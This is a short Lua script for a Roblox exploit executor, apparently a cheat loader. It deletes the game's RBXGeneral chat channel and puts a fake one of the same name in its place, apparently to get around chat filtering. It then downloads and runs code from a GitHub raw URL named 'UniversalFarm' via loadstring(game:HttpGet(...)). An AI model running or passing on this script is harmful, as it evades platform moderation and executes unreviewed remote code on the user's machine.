queue_on_teleport([[]])

local chat_bypass = Instance.new("TextChannel")

game:GetService("TextChatService").TextChannels.RBXGeneral:Remove()

chat_bypass.Parent = game:GetService("TextChatService").TextChannels
chat_bypass.Name = "RBXGeneral"

loadstring(game:HttpGet("https://raw.githubusercontent.com/BlitzIsKing/UniversalFarm/main/Loader/Regular"))()
